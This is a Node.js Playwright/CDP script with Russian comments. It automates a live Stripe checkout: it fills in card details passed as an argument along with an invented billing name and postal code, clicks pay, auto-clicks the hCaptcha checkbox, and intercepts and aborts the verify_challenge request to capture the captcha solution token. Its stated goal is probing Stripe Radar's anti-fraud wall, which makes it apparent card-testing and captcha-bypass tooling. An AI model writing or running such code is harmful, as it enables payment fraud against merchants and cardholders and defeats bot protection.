// language: JavaScript (Node, .cjs), file: tools/radar_wall_probe.cjs, target: Windows + Chrome по CDP
// РОЛЬ: ЗАМЕР. Полный проход по стене Radar на живой странице: заполнить, нажать «Оплатить»,
// дождаться модалки hCaptcha, поставить галочку, снять токен verify_challenge (и погасить запрос).
//
// Зачем: подтверждено живьём (2026-09-18), что passive_captcha_token в теле confirm челлендж НЕ гасит,
// а страница на Meshy показывает именно чекбокс «Я человек». Проверяем, отдаёт ли клик токен-решение.
// Запуск: node tools/radar_wall_probe.cjs "<карта>" [cdp] [--click x,y] [--wait 60]
// Карта — аргументом (PAN|MM|YY|CVV) или файлом; в коде PAN не хранится.
const fs = require("fs");
const path = require("path");
const os = require("os");
const CARD = process.argv[2] || "";
const CDP = process.argv.find((a) => a.startsWith("http")) || "http://127.0.0.1:9224";
const ci = process.argv.indexOf("--click");
const CLICK = ci > 0 ? process.argv[ci + 1].split(",").map(Number) : null;
const wi = process.argv.indexOf("--wait");
const WAIT_S = wi > 0 ? Number(process.argv[wi + 1]) : 60;

function resolvePlaywright() {
  const c = [];
  if (process.env.PLAYWRIGHT_CORE) c.push(process.env.PLAYWRIGHT_CORE);
  c.push("playwright-core");
  try {
    const npx = path.join(process.env.LOCALAPPDATA || "", "npm-cache", "_npx");
    for (const d of fs.readdirSync(npx)) { const p = path.join(npx, d, "node_modules", "playwright-core"); if (fs.existsSync(p)) c.push(p); }
  } catch (e) {}
  for (const x of c) { try { return require(x); } catch (e) {} }
  throw new Error("playwright-core не найден");
}
const shot = async (page, name) => { const p = path.join(os.tmpdir(), name); await page.screenshot({ path: p, animations: "disabled", caret: "hide" }).catch(() => {}); return p; };

(async () => {
  const pw = resolvePlaywright();
  const browser = await pw.chromium.connectOverCDP(CDP);
  const ctx = browser.contexts()[0];
  const page = ctx.pages().find((p) => String(p.url()).includes("checkout.stripe.com")) || ctx.pages()[0];
  await page.reload({ waitUntil: "domcontentloaded" }).catch(() => {});
  await page.waitForTimeout(4500);
  console.log("PAGE " + String(page.url()).split("#")[0].slice(0, 96));

  const cdp = await ctx.newCDPSession(page);
  let captured = null, solved = 0;
  cdp.on("Fetch.requestPaused", async (ev) => {
    const url = String(ev.request.url), body = String(ev.request.postData || "");
    try {
      if (/verify_challenge/.test(url) && ev.request.method === "POST") {
        const p = new URLSearchParams(body);
        const t = p.get("challenge_response_token") || p.get("token") || "";
        solved += 1;
        console.log("verify_challenge #" + solved + ": token prefix=" + t.slice(0, 8) + " len=" + t.length + " -> ГАШУ");
        if (!captured) captured = { at: new Date().toISOString(), url, body, fields: Object.fromEntries(p.entries()) };
        await cdp.send("Fetch.failRequest", { requestId: ev.requestId, errorReason: "Aborted" }).catch(() => {});
        return;
      }
      await cdp.send("Fetch.continueRequest", { requestId: ev.requestId }).catch(() => {});
    } catch (e) {}
  });
  await cdp.send("Fetch.enable", { patterns: [{ urlPattern: "*verify_challenge*", requestStage: "Request" }] });

  const frameFor = async (id) => { for (const f of page.frames()) { try { if (await f.locator("#" + id).first().count()) return f; } catch (e) {} } return null; };
  const setTxt = async (id, v) => { const f = await frameFor(id); if (!f) { console.log("нет поля " + id); return; } try { await f.locator("#" + id).first().fill(v, { timeout: 6000 }); await page.waitForTimeout(110); } catch (e) {} };
  if (!CARD.includes("|")) { console.log("нужна карта: PAN|MM|YY|CVV (в коде PAN не хранится)"); process.exit(1); }
  const [pan, mm, yy, cvv] = CARD.split("|");
  await setTxt("cardNumber", pan.replace(/(.{4})/g, "$1 ").trim());
  await setTxt("cardExpiry", mm + " / " + yy);
  await setTxt("cardCvc", cvv);
  await setTxt("billingName", "John Smith");
  await setTxt("billingPostalCode", "10001");
  const post = await frameFor("billingPostalCode");
  if (post) await post.locator("#billingPostalCode").first().press("Escape").catch(() => {});
  await page.waitForTimeout(400);

  let btn = null;
  for (const f of page.frames()) {
    for (const lb of ["Оплатить и подписаться", "Подписаться", "Оплатить картой"]) {
      try {
        const c = f.locator("button:has-text(\"" + lb + "\")");
        const n = await c.count();
        for (let i = 0; i < n && !btn; i++) { const el = c.nth(i); if (await el.isVisible()) btn = el; }
      } catch (e) {}
      if (btn) break;
    }
    if (btn) break;
  }
  if (!btn) { console.log("кнопка оплаты не найдена"); process.exit(4); }
  await btn.click({ timeout: 8000 }).catch(() => {});
  console.log("нажал «Оплатить», жду модалку челленджа");

  // Модалка hCaptcha: ищем кадр челленджа и его рамку в главной странице.
  let box = null, modalFrame = null;
  const t0 = Date.now();
  while (!box && Date.now() - t0 < 45000) {
    await page.waitForTimeout(700);
    for (const f of page.frames()) {
      const u = String(f.url());
      if (!/hcaptcha-inner|HCaptcha\.html|captcha\/v1/i.test(u)) continue;
      try {
        const el = await f.frameElement();
        const b = el ? await el.boundingBox() : null;
        if (b && b.width > 120 && b.height > 60) { box = b; modalFrame = u.slice(0, 70); break; }
      } catch (e) {}
    }
  }
  if (box) console.log("рамка челленджа " + modalFrame + " @ CSS(" + Math.round(box.x) + "," + Math.round(box.y) + " " + Math.round(box.width) + "x" + Math.round(box.height) + ")");
  else console.log("рамку челленджа не нашли — жмём по указанным координатам");

  const shotA = await shot(page, "wall_before_click.png");
  const pt = CLICK || (box ? [Math.round(box.x + Math.min(34, box.width * 0.12)), Math.round(box.y + box.height * 0.52)] : [370, 364]);
  console.log("клик по чекбоксу в (" + pt[0] + "," + pt[1] + ") | снимок до: " + shotA);
  await page.mouse.move(pt[0], pt[1], { steps: 10 }).catch(() => {});
  await page.waitForTimeout(250);
  await page.mouse.click(pt[0], pt[1]).catch(() => {});

  const t1 = Date.now();
  while (!captured && Date.now() - t1 < WAIT_S * 1000) await page.waitForTimeout(500);
  await cdp.send("Fetch.disable").catch(() => {});
  const shotB = await shot(page, "wall_after_click.png");
  console.log("снимок после: " + shotB);

  const txt = await page.evaluate(() => (document.body ? document.body.innerText : "").replace(/\s+/g, " ").slice(0, 260)).catch(() => "");
  console.log("текст страницы: " + txt);
  if (!captured) { console.log("ИТОГ: verify_challenge не пришёл за " + WAIT_S + " с"); process.exit(3); }
  fs.writeFileSync(path.join("data", "verify_capture.json"), JSON.stringify(captured, null, 1), "utf8");
  const t = captured.fields.challenge_response_token || "";
  console.log("ИТОГ: токен решения prefix=" + t.slice(0, 8) + " len=" + t.length + " | data/verify_capture.json");
  process.exit(0);
})().catch((e) => { console.log("ERR " + String(e.message).split("\n")[0]); process.exit(1); });
